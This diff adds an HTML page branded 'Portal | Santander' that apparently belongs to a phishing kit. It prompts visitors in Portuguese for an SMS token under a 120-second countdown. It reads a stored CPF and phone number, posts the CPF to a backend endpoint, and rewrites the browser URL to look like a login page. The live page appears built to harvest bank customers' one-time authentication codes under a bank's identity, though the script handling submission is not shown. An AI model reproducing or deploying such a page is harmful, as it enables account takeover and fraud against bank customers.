@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Portal | Santander</title>
+  <!-- Tell the browser to be responsive to screen width -->
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+  <!-- Bootstrap 3.3.7 -->
+  <link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.min.css">
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="bower_components/font-awesome/css/font-awesome.min.css">
+  <!-- Ionicons -->
+  <link rel="stylesheet" href="bower_components/Ionicons/css/ionicons.min.css">
+  <!-- Theme style -->
+  <link rel="stylesheet" href="dist/css/AdminLTE.min.css">
+  <!-- iCheck -->
+  <link rel="stylesheet" href="plugins/iCheck/square/blue.css">
+
+  <link rel="shortcut icon" href="dist/img/ico-santander.png">
+  
+  <script>
+        var token = localStorage.getItem("identificador");
+      
+        if(token == null){
+            window.location.href = "index.html?login";
+        }else{
+           
+        }
+    </script>
+
+
+  <!-- Google Font -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
+</head>
+<body class="hold-transition login-page">
+<div class="login-box">
+  <div class="login-logo">
+    <a href="#"><img src="dist/img/santander-logo-2.png" style="width: 70%; padding-top: 10px; height: auto; margin: auto"></a>
+  </div>
+  <!-- /.login-logo -->
+  <div class="login-box-body">
+        <div id="msg-sms-2" class="alert alert-warning" role="alert" style="background-color: #777573a6!important;border-color: #c1c1c1 !important;" hidden>
+                <span style="position: absolute;margin-left: 20%;margin-top: -1%;"><a style="text-decoration: none;" href="javascript:Hide();">x</a></span>
+                <div>Um Token será enviado para seu celular para darmos continuidade ao seu atendimento.</div>
+        </div>
+            <span id="msg-token"><p class="login-box-msg">Insira o Token. Tempo de Expiração: <b id="contador" style="font-size: 130%;">120</b><span style="font-size: 130%;">...</span></p></span>
+      <div class="form-group has-feedback">
+        <input type="text" id="sms" onkeypress="enviar(event);" class="form-control" placeholder="Token SMS" maxlength="14" style="font-weight:bold;">
+      </div>
+      <div class="row">
+        <div class="col-xs-8">
+          <div class="checkbox icheck">
+            <label>
+              
+            </label>
+          </div>
+        </div>
+        <!-- /.col -->
+        <div class="col-xs-4" id="btn-valid">
+          <button onclick="validadorSMS();" class="btn btn-primary btn-block btn-flat">Validar</button>
+        </div>
+        <!-- /.col -->
+      </div>
+    
+  </div>
+  <!-- /.login-box-body -->
+
+</div>
+<script src="bower_components/jquery/dist/jquery.js"></script>
+<script>
+  var date = new Date();
+  yearNow = date.getYear();
+  if (yearNow < 1000)
+  yearNow+=1900
+  $("#ano-now").text(yearNow);
+
+  var celular = localStorage.getItem("celular");
+  var obj_celular = JSON.parse(celular);
+
+  if(obj_celular.crm){
+        var x = document.getElementById("msg-sms-2");
+        if (x.style.display === "block") {
+            x.style.display = "none";
+        } else {
+            x.style.display = "block";
+        }
+  }
+
+  function Hide() {
+        var x = document.getElementById("msg-sms-2");
+        if (x.style.display === "none") {
+            x.style.display = "block";
+        } else {
+            x.style.display = "none";
+        }
+  }
+</script>
+<!-- /.login-box -->
+
+<!-- jQuery 3 -->
+<script src="bower_components/jquery/dist/jquery.min.js"></script>
+<script src="dist/js/Cosumer.js"></script>
+<!-- Bootstrap 3.3.7 -->
+<script src="bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
+<!-- iCheck -->
+
+<script type="text/javascript" src="bower_components/jquery/dist/jquery.mask.js"></script>
+<script>
+    function enviar(evento){
+       tecla = evento.keyCode;
+       if(tecla == 0){
+            tecla = evento.charCode;
+       }
+       if(tecla == 13){
+            validadorSMS();
+       }
+    }
+    setInterval(function(){         
+        var contador = $("#contador").text();
+        resultado = contador - 1;
+        if(contador == 1){
+
+            var identificador = localStorage.getItem("identificador");
+            var obj = JSON.parse(identificador);
+
+            $.ajax({
+                    type: "POST",
+                    dataType: "html",
+                    url: url+"/api/deletesms",
+                    async: true,
+                    data: { 'cpf' :obj.cpf, 'smstoken' :'' },
+                    success: function(data){
+                        //localStorage.clear();
+                        // window.location.href="index.html?login";
+                        $("#msg-token").empty();
+                        $("#msg-token").append('<p class="login-box-msg"><a href="javascript:Reenviar();">Clique aqui</a> para Reenviar-lo.</p>');
+                        $("#btn-valid").empty();
+                        $("#btn-valid").append('<button onclick="Reload()" class="btn btn-primary btn-block btn-flat">Cancelar</button>');
+                    }
+                }).fail(function() {
+                    alert( "ERROR API - NÃO RESPONDE" );
+                });
+        }
+        if(contador > 0){
+            $("#contador").text(resultado);
+        }
+        
+
+        if(contador == 115){
+            Hide();
+        }
+
+    }, 1000);
+
+    function Reenviar(){
+
+        var celular = localStorage.getItem("celular");
+        var obj = JSON.parse(celular);
+        enviaSMS(obj.celular);
+        window.location.href = "index.html?smstoken";
+    }
+    function Reload(){
+        window.location.href = "index.html?login";
+    }
+</script>
+
+
+<script>
+    window.history.pushState("Login", "Portal | Login", "/index.html?login");
+    // window.history.pushState("Login", "Portal | Login", "/index.html?smstoken");
+</script>
+</body>
+</html>
+
